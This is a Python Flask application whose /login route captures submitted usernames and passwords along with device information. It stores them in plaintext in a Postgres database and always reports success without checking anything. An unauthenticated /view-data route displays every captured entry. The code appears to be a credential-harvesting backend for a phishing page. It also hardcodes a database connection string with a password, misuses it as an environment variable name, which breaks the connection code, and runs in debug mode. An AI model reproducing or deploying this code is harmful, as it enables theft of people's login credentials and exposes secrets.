from flask import Flask, request, jsonify, render_template
import os
import psycopg2
from urllib.parse import urlparse

app = Flask(__name__)

# Get database URL from environment variables
DATABASE_URL = os.getenv('postgres://default:VIlNZBpO64SR@ep-restless-hill-a4xtls9n-pooler.us-east-1.aws.neon.tech:5432/verceldb?sslmode=require')

# Connect to your database
def get_db_connection():
    url = urlparse(DATABASE_URL)
    connection = psycopg2.connect(
        database=url.path[1:],
        user=url.username,
        password=url.password,
        host=url.hostname,
        port=url.port
    )
    return connection

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.json.get('username')
    password = request.json.get('password')
    device_info = request.headers.get('User-Agent')

    data = {
        'username': username,
        'password': password,
        'device_info': device_info
    }

    # Store data in Postgres
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute('INSERT INTO login_data (username, password, device_info) VALUES (%s, %s, %s)',
                (username, password, device_info))
    conn.commit()
    cur.close()
    conn.close()

    return jsonify({'status': 'login successful'}), 200

@app.route('/view-data', methods=['GET'])
def view_data():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute('SELECT * FROM login_data')
    data = cur.fetchall()
    cur.close()
    conn.close()

    return render_template('view_data.html', data=data)

if __name__ == '__main__':
    app.run(debug=True)
